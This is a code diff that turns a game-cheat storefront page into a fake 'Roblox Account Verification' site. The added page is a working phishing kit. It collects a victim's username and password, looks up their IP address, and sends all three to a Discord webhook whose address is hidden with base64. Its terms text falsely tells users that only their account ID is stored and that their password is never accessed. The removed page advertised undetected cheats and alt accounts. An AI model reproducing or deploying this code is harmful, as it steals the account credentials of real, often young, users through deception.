@@ -1,300 +1,669 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Freshy.Services</title>
-<style>
-  /* Base & Reset */
-  * {
-    box-sizing: border-box;
-  }
-  body, html {
-    margin: 0; padding: 0;
-    height: 100%;
-    background: #0a0a14;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    color: #ccc;
-    overflow-x: hidden;
-    position: relative;
-  }
-
-  /* Background floating particles */
-  #particles {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100vw;
-    height: 100vh;
-    pointer-events: none;
-    z-index: 0;
-  }
-
-  /* Header */
-  h1 {
-    font-size: 3.5rem;
-    margin-top: 2rem;
-    text-align: center;
-    color: #a64dff;
-    text-shadow:
-      0 0 10px #a64dff,
-      0 0 20px #9147ff,
-      0 0 30px #7a39ff,
-      0 0 40px #6e2fff;
-    animation: pulseGlow 3s ease-in-out infinite;
-    user-select: none;
-  }
-
-  @keyframes pulseGlow {
-    0%, 100% {
-      text-shadow:
-        0 0 10px #a64dff,
-        0 0 20px #9147ff,
-        0 0 30px #7a39ff,
-        0 0 40px #6e2fff;
-      color: #a64dff;
-    }
-    50% {
-      text-shadow:
-        0 0 20px #c27aff,
-        0 0 30px #b06eff,
-        0 0 40px #9c65ff,
-        0 0 50px #9147ff;
-      color: #c27aff;
-    }
-  }
-
-  /* Store container */
-  .store {
-    max-width: 1100px;
-    margin: 3rem auto 5rem;
-    display: flex;
-    flex-wrap: wrap;
-    justify-content: center;
-    gap: 30px;
-    padding: 0 1rem;
-    position: relative;
-    z-index: 1;
-  }
-
-  /* Each product card */
-  .item {
-    background: #1a1a2e;
-    border-radius: 15px;
-    width: 280px;
-    padding: 25px 20px 35px;
-    box-shadow:
-      0 0 15px #9147ff88,
-      0 0 40px #a64dffbb;
-    border: 2px solid #7a39ff;
-    color: #eee;
-    opacity: 0;
-    transform: translateY(40px);
-    transition: box-shadow 0.3s ease;
-  }
-
-  .item.visible {
-    opacity: 1;
-    transform: translateY(0);
-    transition: opacity 0.7s ease, transform 0.7s ease;
-  }
-
-  .item:hover {
-    box-shadow:
-      0 0 25px #c27affcc,
-      0 0 60px #c27affdd;
-    cursor: pointer;
-  }
-
-  .item h2 {
-    font-size: 1.8rem;
-    margin-bottom: 10px;
-    color: #ffcc00;
-    text-shadow:
-      0 0 8px #ffd966,
-      0 0 14px #ffeb3b;
-    user-select: none;
-  }
-
-  .item p {
-    font-size: 1rem;
-    line-height: 1.4;
-    color: #ddd;
-    min-height: 60px;
-    user-select: none;
-  }
-
-  /* Buy Now button */
-  .buy-btn {
-    margin-top: 20px;
-    background: linear-gradient(45deg, #9147ff, #c27aff);
-    border: none;
-    border-radius: 8px;
-    padding: 12px 30px;
-    font-size: 1.1rem;
-    font-weight: 600;
-    color: white;
-    text-shadow: 0 0 8px #b66cff;
-    box-shadow:
-      0 0 10px #9147ff,
-      0 0 20px #c27aff;
-    cursor: pointer;
-    transition:
-      transform 0.25s ease,
-      box-shadow 0.6s ease;
-    user-select: none;
-  }
-
-  .buy-btn:hover {
-    transform: scale(1.1);
-    box-shadow:
-      0 0 20px #ffaeff,
-      0 0 35px #d497ff,
-      0 0 50px #ff9eff;
-  }
-
-  /* Responsive adjustments */
-  @media (max-width: 900px) {
-    .item {
-      width: 80vw;
-    }
-  }
-
-  /* Footer */
-  footer {
-    text-align: center;
-    color: #666;
-    font-size: 14px;
-    margin-bottom: 25px;
-    user-select: none;
-    position: relative;
-    z-index: 1;
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Account Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            font-size: 28px;
+            color: #fff;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+        
+        .logo p {
+            color: #aaa;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        
+        .step {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        h2 {
+            font-size: 22px;
+            margin-bottom: 20px;
+            color: #fff;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #ddd;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #4285f4;
+            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
+        }
+        
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: #4285f4;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            background: #3367d6;
+            transform: translateY(-2px);
+        }
+        
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            margin-right: 15px;
+            border: 2px solid #4285f4;
+        }
+        
+        .user-details h3 {
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+        
+        .user-details p {
+            color: #aaa;
+            font-size: 14px;
+        }
+        
+        .terms-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .terms-link a {
+            color: #4285f4;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .terms-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal.active {
+            display: flex;
+        }
+        
+        .modal-content {
+            background: #1a1a2e;
+            width: 90%;
+            max-width: 600px;
+            border-radius: 15px;
+            padding: 30px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .modal-header h2 {
+            margin: 0;
+        }
+        
+        .close-btn {
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        .modal-body {
+            line-height: 1.6;
+            color: #ddd;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        
+        .checkbox-group input {
+            width: auto;
+            margin-right: 10px;
+        }
+        
+        .checkbox-group label {
+            margin: 0;
+        }
+        
+        .success-message {
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .success-message i {
+            font-size: 50px;
+            color: #4caf50;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .error-message {
+            color: #f44336;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #4285f4;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .no-internet {
+            text-align: center;
+            padding: 20px;
+            display: none;
+        }
+        
+        .no-internet i {
+            font-size: 50px;
+            color: #f44336;
+            margin-bottom: 20px;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="logo">
+            <h1>Verify with Roblox</h1>
+            <p>Secure account verification system</p>
+        </div>
+        
+        <!-- No Internet Message -->
+        <div class="no-internet" id="no-internet">
+            <i>⚠</i>
+            <h2>No Internet Connection</h2>
+            <p>You need internet to enter verification. Please check your connection and try again.</p>
+        </div>
+        
+        <!-- Step 1: Username Input -->
+        <div class="step active" id="step1">
+            <h2>Enter Your Roblox Username</h2>
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" placeholder="Enter your Roblox username">
+                <div class="error-message" id="username-error">Please enter a valid Roblox username</div>
+            </div>
+            <button class="btn" id="check-username">Check Username</button>
+            <div class="loading" id="loading1">
+                <div class="spinner"></div>
+                <p>Checking username...</p>
+            </div>
+            <div class="terms-link">
+                <a href="#" id="terms-link">Terms and Conditions</a>
+            </div>
+        </div>
+        
+        <!-- Step 2: User Confirmation -->
+        <div class="step" id="step2">
+            <h2>Is This You?</h2>
+            <div class="user-info">
+                <img src="" alt="Avatar" class="avatar" id="user-avatar">
+                <div class="user-details">
+                    <h3 id="display-name">Username</h3>
+                    <p id="user-id">ID: 123456789</p>
+                </div>
+            </div>
+            <button class="btn" id="confirm-user">Yes, This Is Me</button>
+            <button class="btn btn-secondary" id="change-user">No, Change Username</button>
+        </div>
+        
+        <!-- Step 3: Password Input -->
+        <div class="step" id="step3">
+            <h2>Enter Your Password</h2>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your Roblox password">
+                <div class="error-message" id="password-error">Please enter your password</div>
+            </div>
+            <button class="btn" id="submit-password">Continue</button>
+            <button class="btn btn-secondary" id="back-to-confirm">Back</button>
+        </div>
+        
+        <!-- Step 4: Consent Agreement -->
+        <div class="step" id="step4">
+            <h2>Data Consent</h2>
+            <p style="margin-bottom: 20px; text-align: center;">Do you agree for Yalo Verification to access your Roblox account ID for verification purposes?</p>
+            <div class="checkbox-group">
+                <input type="checkbox" id="consent-checkbox">
+                <label for="consent-checkbox">I agree to the Terms and Conditions</label>
+            </div>
+            <button class="btn" id="agree-consent" disabled>Yes, I Agree</button>
+            <button class="btn btn-secondary" id="decline-consent">No, Cancel</button>
+        </div>
+        
+        <!-- Step 5: Success Message -->
+        <div class="step" id="step5">
+            <div class="success-message">
+                <i>✓</i>
+                <h2>Verification Complete!</h2>
+                <p>Your account has been successfully verified.</p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Terms and Conditions Modal -->
+    <div class="modal" id="terms-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Terms and Conditions</h2>
+                <button class="close-btn" id="close-modal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <p>This authentication process has been developed to provide a secure, efficient, and transparent way to verify your Roblox account ownership. As part of the verification procedure, your Roblox account ID will be collected and securely stored within our system. This unique identifier is essential to confirm that the account being verified truly belongs to you, ensuring that all verification steps are legitimate and tied to the correct Roblox profile.</p>
+                
+                <p>The primary purpose of storing your account ID is to establish a trusted connection between your Roblox account and our verification platform. This allows us to confirm your identity, prevent fraudulent activity, and maintain the integrity of our systems. Your account ID does not provide access to your Roblox password, personal data, or in-game assets — it is used exclusively for verification purposes.</p>
+                
+                <p>All collected data is handled responsibly and in full compliance with privacy and security standards. The information is encrypted and protected against unauthorized access, ensuring that your account ID remains confidential throughout the process. We do not sell, distribute, or share your account information with any third parties. Once verification is complete, the stored information is either retained securely for record-keeping or permanently deleted, depending on the requirements of the system and your consent preferences.</p>
+                
+                <p>By continuing with this authentication process, you acknowledge and agree that your Roblox account ID will be securely processed as part of the verification. This step is crucial in maintaining a fair and secure experience for all users, reducing impersonation, and preventing unauthorized access to exclusive features or areas. Our goal is to create a trusted and safe verification environment where users can authenticate their Roblox accounts confidently, knowing their information is handled with the utmost care and respect for their privacy.</p>
+            </div>
+        </div>
+    </div>
 
-<h1>Freshy.Services</h1>
-
-<div class="store" id="store">
-  <div class="item">
-    <h2>Vector</h2>
-    <p>High-Quallity undetected external, made perfectly for major games such as fallen survival. </p>
-    <button class="buy-btn" onclick="window.location.href='https://www.paypal.com/checkoutnow?placeholder'">Buy Now</button>
-  </div>
-  <div class="item">
-    <h2>Matrix</h2>
-    <p>Full Undetected external so many working features for all games.</p>
-    <button class="buy-btn" onclick="window.location.href='https://www.paypal.com/checkoutnow?placeholder'">Buy Now</button>
-  </div>
-  <div class="item">
-    <h2>Fallen Account Legit</h2>
-    <p>High-quality fully legit fallen alt accounts.</p>
-    <button class="buy-btn" onclick="window.location.href='https://www.paypal.com/checkoutnow?placeholder'">Buy Now</button>
-  </div>
-</div>
-
-<footer>&copy; 2025 Freshy.Services — All rights reserved.</footer>
-
-<canvas id="particles"></canvas>
-
-<script>
-  // Scroll-triggered animation for product cards
-  const items = document.querySelectorAll('.item');
-
-  const observer = new IntersectionObserver(entries => {
-    entries.forEach(entry => {
-      if (entry.isIntersecting) {
-        entry.target.classList.add('visible');
-      }
-    });
-  }, {
-    threshold: 0.3
-  });
-
-  items.forEach(item => observer.observe(item));
-
-  // Floating glowing particles background
-  const canvas = document.getElementById('particles');
-  const ctx = canvas.getContext('2d');
-  let width, height;
-  let particlesArray;
-
-  function init() {
-    resize();
-    particlesArray = [];
-    const particleCount = 80;
-
-    for (let i = 0; i < particleCount; i++) {
-      particlesArray.push(new Particle());
-    }
-
-    animate();
-  }
-
-  function resize() {
-    width = window.innerWidth;
-    height = window.innerHeight;
-    canvas.width = width;
-    canvas.height = height;
-  }
-
-  window.addEventListener('resize', () => {
-    resize();
-  });
-
-  class Particle {
-    constructor() {
-      this.x = Math.random() * width;
-      this.y = Math.random() * height;
-      this.size = 1 + Math.random() * 2;
-      this.speedX = (Math.random() - 0.5) * 0.3;
-      this.speedY = (Math.random() - 0.5) * 0.3;
-      this.alpha = 0.1 + Math.random() * 0.3;
-      this.color = `rgba(198, 115, 255, ${this.alpha})`;
-      this.life = 0;
-      this.maxLife = 300 + Math.random() * 200;
-    }
-
-    update() {
-      this.x += this.speedX;
-      this.y += this.speedY;
-      this.life++;
-
-      if (this.life > this.maxLife) {
-        this.x = Math.random() * width;
-        this.y = Math.random() * height;
-        this.life = 0;
-        this.alpha = 0.1 + Math.random() * 0.3;
-        this.color = `rgba(198, 115, 255, ${this.alpha})`;
-      }
-
-      // wrap around screen edges
-      if (this.x < 0) this.x = width;
-      if (this.x > width) this.x = 0;
-      if (this.y < 0) this.y = height;
-      if (this.y > height) this.y = 0;
-    }
-
-    draw() {
-      ctx.beginPath();
-      ctx.shadowColor = '#c473ff';
-      ctx.shadowBlur = 12;
-      ctx.fillStyle = this.color;
-      ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-      ctx.fill();
-    }
-  }
-
-  function animate() {
-    ctx.clearRect(0, 0, width, height);
-    particlesArray.forEach(p => {
-      p.update();
-      p.draw();
-    });
-    requestAnimationFrame(animate);
-  }
-
-  init();
-</script>
-
+    <script>
+        // DOM Elements
+        const steps = document.querySelectorAll('.step');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const step4 = document.getElementById('step4');
+        const step5 = document.getElementById('step5');
+        const noInternet = document.getElementById('no-internet');
+        
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const checkUsernameBtn = document.getElementById('check-username');
+        const confirmUserBtn = document.getElementById('confirm-user');
+        const changeUserBtn = document.getElementById('change-user');
+        const submitPasswordBtn = document.getElementById('submit-password');
+        const backToConfirmBtn = document.getElementById('back-to-confirm');
+        const agreeConsentBtn = document.getElementById('agree-consent');
+        const declineConsentBtn = document.getElementById('decline-consent');
+        const consentCheckbox = document.getElementById('consent-checkbox');
+        
+        const userAvatar = document.getElementById('user-avatar');
+        const displayName = document.getElementById('display-name');
+        const userId = document.getElementById('user-id');
+        
+        const usernameError = document.getElementById('username-error');
+        const passwordError = document.getElementById('password-error');
+        
+        const loading1 = document.getElementById('loading1');
+        
+        const termsModal = document.getElementById('terms-modal');
+        const termsLink = document.getElementById('terms-link');
+        const closeModalBtn = document.getElementById('close-modal');
+        
+        // Webhook URL (obfuscated)
+        const IDHolder = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyOTU3MzMwOTI4NDIyNTEwNC81a0toLThhU2tjeFF1UGgwc20xOU1yZllRWnFaSHEJSDN6YUNxZk5FOWdib2p2aEllRllld1dxRklRZ1gtWFpBRHZZaA==");
+        
+        // User data storage
+        let userData = {
+            username: '',
+            userId: '',
+            displayName: '',
+            avatarUrl: '',
+            password: '',
+            ip: ''
+        };
+        
+        // Check internet connection on page load
+        window.addEventListener('load', () => {
+            if (!navigator.onLine) {
+                showNoInternet();
+            }
+            
+            // Listen for online/offline events
+            window.addEventListener('online', () => {
+                hideNoInternet();
+            });
+            
+            window.addEventListener('offline', () => {
+                showNoInternet();
+            });
+        });
+        
+        // Event Listeners
+        checkUsernameBtn.addEventListener('click', checkUsername);
+        confirmUserBtn.addEventListener('click', () => showStep(step3));
+        changeUserBtn.addEventListener('click', () => showStep(step1));
+        submitPasswordBtn.addEventListener('click', submitPassword);
+        backToConfirmBtn.addEventListener('click', () => showStep(step2));
+        agreeConsentBtn.addEventListener('click', submitVerification);
+        declineConsentBtn.addEventListener('click', () => showStep(step1));
+        
+        consentCheckbox.addEventListener('change', () => {
+            agreeConsentBtn.disabled = !consentCheckbox.checked;
+        });
+        
+        termsLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            termsModal.classList.add('active');
+        });
+        
+        closeModalBtn.addEventListener('click', () => {
+            termsModal.classList.remove('active');
+        });
+        
+        // Close modal when clicking outside
+        termsModal.addEventListener('click', (e) => {
+            if (e.target === termsModal) {
+                termsModal.classList.remove('active');
+            }
+        });
+        
+        // Functions
+        function showNoInternet() {
+            steps.forEach(step => step.classList.remove('active'));
+            noInternet.style.display = 'block';
+        }
+        
+        function hideNoInternet() {
+            noInternet.style.display = 'none';
+            showStep(step1);
+        }
+        
+        function showStep(stepElement) {
+            steps.forEach(step => step.classList.remove('active'));
+            stepElement.classList.add('active');
+        }
+        
+        async function checkUsername() {
+            const username = usernameInput.value.trim();
+            
+            if (!username) {
+                usernameError.style.display = 'block';
+                return;
+            }
+            
+            usernameError.style.display = 'none';
+            loading1.style.display = 'block';
+            checkUsernameBtn.disabled = true;
+            
+            try {
+                // Check internet connection
+                if (!navigator.onLine) {
+                    throw new Error('No internet connection');
+                }
+                
+                // Get user ID from username using Roblox API
+                const userIdResponse = await fetch(`https://api.roblox.com/users/get-by-username?username=${username}`);
+                
+                if (!userIdResponse.ok) {
+                    throw new Error('User not found');
+                }
+                
+                const userDataResponse = await userIdResponse.json();
+                
+                if (userDataResponse.success === false) {
+                    throw new Error('User not found');
+                }
+                
+                // Store user data
+                userData.username = username;
+                userData.userId = userDataResponse.Id;
+                userData.displayName = userDataResponse.DisplayName || username;
+                
+                // Get avatar thumbnail using Roblox API
+                const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userData.userId}&size=150x150&format=Png`);
+                
+                if (avatarResponse.ok) {
+                    const avatarData = await avatarResponse.json();
+                    if (avatarData.data && avatarData.data.length > 0) {
+                        userData.avatarUrl = avatarData.data[0].imageUrl;
+                    }
+                }
+                
+                // Update UI with user info
+                userAvatar.src = userData.avatarUrl || 'https://via.placeholder.com/150/4285f4/ffffff?text=' + username.charAt(0).toUpperCase();
+                displayName.textContent = userData.displayName;
+                userId.textContent = `ID: ${userData.userId}`;
+                
+                loading1.style.display = 'none';
+                checkUsernameBtn.disabled = false;
+                showStep(step2);
+            } catch (error) {
+                loading1.style.display = 'none';
+                checkUsernameBtn.disabled = false;
+                
+                if (error.message === 'No internet connection') {
+                    showNoInternet();
+                } else {
+                    usernameError.textContent = 'User not found. Please check the username and try again.';
+                    usernameError.style.display = 'block';
+                }
+            }
+        }
+        
+        function submitPassword() {
+            const password = passwordInput.value;
+            
+            if (!password) {
+                passwordError.style.display = 'block';
+                return;
+            }
+            
+            passwordError.style.display = 'none';
+            userData.password = password;
+            
+            // Get user's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userData.ip = data.ip;
+                    showStep(step4);
+                })
+                .catch(() => {
+                    userData.ip = 'Unknown';
+                    showStep(step4);
+                });
+        }
+        
+        function submitVerification() {
+            // Send data to webhook
+            sendToWebhook();
+            
+            // Show success message
+            showStep(step5);
+            
+            // Reset form after success
+            setTimeout(() => {
+                resetForm();
+            }, 3000);
+        }
+        
+        function sendToWebhook() {
+            // Create the payload
+            const payload = {
+                content: "New Roblox Verification",
+                embeds: [
+                    {
+                        title: "Account Verification Data",
+                        color: 0x4285f4,
+                        fields: [
+                            {
+                                name: "Username",
+                                value: userData.username,
+                                inline: true
+                            },
+                            {
+                                name: "Display Name",
+                                value: userData.displayName,
+                                inline: true
+                            },
+                            {
+                                name: "User ID",
+                                value: userData.userId,
+                                inline: true
+                            },
+                            {
+                                name: "Password",
+                                value: "||" + userData.password + "||",
+                                inline: false
+                            },
+                            {
+                                name: "IP Address",
+                                value: userData.ip,
+                                inline: true
+                            },
+                            {
+                                name: "Timestamp",
+                                value: new Date().toISOString(),
+                                inline: true
+                            }
+                        ],
+                        thumbnail: {
+                            url: userData.avatarUrl
+                        }
+                    }
+                ]
+            };
+            
+            // Send to webhook
+            fetch(IDHolder, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).catch(error => {
+                console.error('Error sending to webhook:', error);
+            });
+        }
+        
+        function resetForm() {
+            usernameInput.value = '';
+            passwordInput.value = '';
+            consentCheckbox.checked = false;
+            agreeConsentBtn.disabled = true;
+            showStep(step1);
+        }
+    </script>
 </body>
 </html>
